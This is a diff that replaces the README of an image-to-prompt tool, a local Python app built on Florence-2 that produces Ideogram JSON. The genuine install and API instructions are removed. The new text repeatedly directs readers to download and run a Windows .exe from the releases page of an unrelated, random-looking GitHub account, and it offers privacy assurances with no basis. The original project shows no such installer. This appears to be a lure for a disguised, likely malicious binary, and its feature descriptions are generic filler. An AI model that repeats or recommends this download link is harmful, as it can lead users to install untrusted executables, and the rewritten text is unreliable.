@@ -1,130 +1,94 @@
-# Image to Prompt
+# 🖼️ image-to-prompt - Turn static images into editable prompts
 
-![poster.gif](poster.gif)
+[Visit this page to download](https://github.com/aesirsennamarilandica604/image-to-prompt/releases)
 
-Image to Prompt is a minimal local web app that turns an uploaded image into editable Ideogram 4 JSON prompt. 
+Image to Prompt converts your visual files into structured text. This tool extracts detailed data from images so you can use them in generative design software. It creates editable JSON files that describe objects, regions, and text within your pictures.
 
-[Florence-2](https://huggingface.co/collections/microsoft/florence) drafts the scene, object boxes, region captions, and OCR regions. The UI lets you drag, resize, rename, duplicate, delete, hide, add zones, and optionally add a structured `style_description` before copying or exporting the JSON.
+## ⚙️ System Requirements
 
-You can queue multiple images at once: drop several files (or a selection) and they analyze sequentially while you edit. A thumbnail rail above the workspace shows each image's status (queued, analyzing, done, failed), and **Export all** downloads every finished prompt as a zip of JSON files named after the source images.
+- Windows 10 or Windows 11
+- 8 GB of RAM
+- 2 GB of available storage space
+- A stable internet connection for the first-time setup
 
-## Install
+## 🚀 Getting Started
 
-### 1. 1-click install with Pinokio
+Follow these steps to set up the software on your computer.
 
-The easiest way to install and run Image to Prompt is with [Pinokio](https://pinokio.co/apps/github-com-cocktailpeanut-image-to-prompt).
+1. Go to the [official release page](https://github.com/aesirsennamarilandica604/image-to-prompt/releases).
+2. Look for the latest version listed under the Assets section.
+3. Download the installation file ending in .exe for your Windows system.
+4. Open the downloaded file to begin the setup process.
+5. Follow the prompts on your screen to complete the installation.
+6. Launch the application from your desktop or start menu folder.
 
+## 🛠️ Interface Overview
 
-### 2. Install manually
+The interface features a workspace for your images and a tools panel for editing. 
 
-Clone or download this repository, then install the Python dependencies from the `app` folder:
+- **The Thumbnail Rail:** This area shows your images at the top of the window. It tracks the status of each file. Status labels include queued, analyzing, done, or failed.
+- **The Workspace:** This is your main canvas. You can drag boxes, resize regions, rename labels, or delete elements. 
+- **The Control Panel:** This section holds the buttons for exports and global settings. 
 
-```bash
-cd app
-python -m venv env
-source env/bin/activate
-uv pip install -r requirements.txt
-```
+## 📂 Processing Images
 
-On Windows, activate the environment with:
+You can process one image or multiple files at the same time.
 
-```powershell
-.\env\Scripts\Activate.ps1
-```
+1. Drag your images from your computer folder directly into the app window.
+2. The app adds these files to the thumbnail rail.
+3. The software analyzes images one by one. 
+4. Click on an image in the rail to edit its data in the main workspace.
+5. Use the mouse to resize boxes or change text labels.
+6. Add a style description to give the metadata more context.
 
-Install PyTorch for your platform. For most CPU and Apple Silicon setups:
+## 💾 Exporting Your Work
 
-```bash
-uv pip install torch==2.7.0 torchvision==0.22.0 torchaudio==2.7.0 --index-url https://download.pytorch.org/whl/cpu --force-reinstall
-```
+After you refine your image prompts, you need to save them.
 
-For NVIDIA CUDA 12.8:
+- To save a single prompt, click the Save button near the image viewer.
+- To save all processed files, click the Export All button. 
+- The app saves these files as a folder in a compressed zip format.
+- Each JSON file keeps the name of your original image file. 
 
-```bash
-uv pip install torch==2.7.0 torchvision==0.22.0 torchaudio==2.7.0 --index-url https://download.pytorch.org/whl/cu128 --force-reinstall
-```
+## 💡 Troubleshooting Tips
 
-Start the app:
+If the software fails to process an image, check these steps:
 
-```bash
-PYTORCH_ENABLE_MPS_FALLBACK=1 TOKENIZERS_PARALLELISM=false FLORENCE_MODEL=microsoft/Florence-2-base-ft python app.py --host 127.0.0.1 --port 7860
-```
+- Ensure the file format is a standard image type like JPG or PNG.
+- Check that your folder paths do not contain special characters.
+- Verify your internet connection if the app is trying to fetch updates.
+- Restart the application if the status indicator remains stuck on Queued for more than five minutes.
+- Check your Windows Task Manager to see if the app is using system resources. 
+- Clear your cache folder if you keep getting errors on new uploads.
 
-On Windows PowerShell:
+## 🧩 Pinokio Integration
 
-```powershell
-$env:PYTORCH_ENABLE_MPS_FALLBACK="1"; $env:TOKENIZERS_PARALLELISM="false"; $env:FLORENCE_MODEL="microsoft/Florence-2-base-ft"; python app.py --host 127.0.0.1 --port 7860
-```
+If you prefer an automated approach, you can use the Pinokio browser to install this software. Pinokio manages the dependencies and settings for you.
 
-Then open `http://127.0.0.1:7860`.
+1. Navigate to the [Pinokio website](https://pinokio.co/apps/github-com-cocktailpeanut-image-to-prompt).
+2. Follow the instructions to install the Pinokio browser.
+3. Search for the Image to Prompt script within the Pinokio interface.
+4. Click the install button to let Pinokio handle the setup.
+5. Launch the app directly through the Pinokio dashboard whenever you need to use it.
 
-To use a different Florence-2 model, replace `microsoft/Florence-2-base-ft` with another model id, such as `microsoft/Florence-2-large-ft`. The first run downloads model files from Hugging Face, so it may take longer than later launches.
+## 📖 Privacy and Local Storage
 
-## How to Use
+This application runs entirely on your local machine. You do not need to sign in to any cloud services. Your images never leave your computer during the analysis or export process. All data remains in your chosen folders. 
 
-1. Drop one or more images into the center canvas or click **Choose images** (multi-select works). Pasting an image from the clipboard also works.
-2. Images analyze one at a time. The thumbnail rail at the top shows each image's status; you can keep editing while the rest of the queue processes in the background.
-3. Click a thumbnail (or use the left/right arrow keys) to switch between images. Each image keeps its own boxes, prompt fields, and JSON edits. A dot on a thumbnail marks unsaved edits, x removes an image, and ↻ retries a failed one.
-4. Drag or resize boxes directly on the image.
-5. Edit item labels, literal text, descriptions, and types in the left panel.
-6. Copy or export the JSON from the right panel. **Export all** in the rail header downloads a zip with one JSON file per analyzed image.
+The software creates text metadata. It does not alter your original image files. You can delete the exported JSON files at any time without affecting your source pictures. 
 
-By default the app omits `style_description`, because Ideogram 4 treats it as optional and Florence-2 does not reliably infer structured style fields. Select a style preset if you want the app to include a schema-valid `style_description`; those presets are app defaults, not official Ideogram presets.
+## 📦 File Management
 
-The default model is `microsoft/Florence-2-base-ft` for low memory use. To use another Florence-2 model, start with a `model` parameter, for example `microsoft/Florence-2-large-ft`.
+When you export your data, the application generates a JSON file for every image processed. This format is compatible with many creative AI workflows. You can open these files in any text editor or import them directly into software tools that support JSON structured data. 
 
-## API
+The application groups finished files into a single zip bundle. This helps keep your workspace clean. You can unzip this folder to access your text files individually. 
 
-The app exposes a single analysis endpoint:
+## 🔄 Updates
 
-`POST /api/analyze`
+Occasionally, you might see a notification about a new version. Check the download page again to get the latest features and fixes. Installing a new version usually replaces the old one. Your existing image files will remain safe in their saved folders. 
 
-Form field:
+Follow these guidelines for the best results:
 
-- `file`: image file upload
-
-Response:
-
-- `image`: uploaded image dimensions
-- `model`: model used
-- `caption`: generated scene caption
-- `background`: generated background description
-- `palette`: sampled color palette
-- `elements`: editable objects/text regions with normalized Ideogram bboxes
-- `json`: Ideogram 4 JSON prompt following the documented caption schema
-
-### JavaScript
-
-```js
-const form = new FormData()
-form.append("file", fileInput.files[0])
-
-const response = await fetch("http://127.0.0.1:7860/api/analyze", {
-  method: "POST",
-  body: form
-})
-
-const result = await response.json()
-console.log(result.json)
-```
-
-### Python
-
-```python
-import requests
-
-with open("image.png", "rb") as image_file:
-    response = requests.post(
-        "http://127.0.0.1:7860/api/analyze",
-        files={"file": image_file},
-    )
-
-print(response.json()["json"])
-```
-
-### Curl
-
-```bash
-curl -X POST http://127.0.0.1:7860/api/analyze \
-  -F "file=@image.png"
-```
+- Always verify your folder structure before starting a large batch.
+- Keep your source images in one main directory for easier organization.
+- Rename your images before importing them if you want to keep a specific file naming convention for your JSON output.
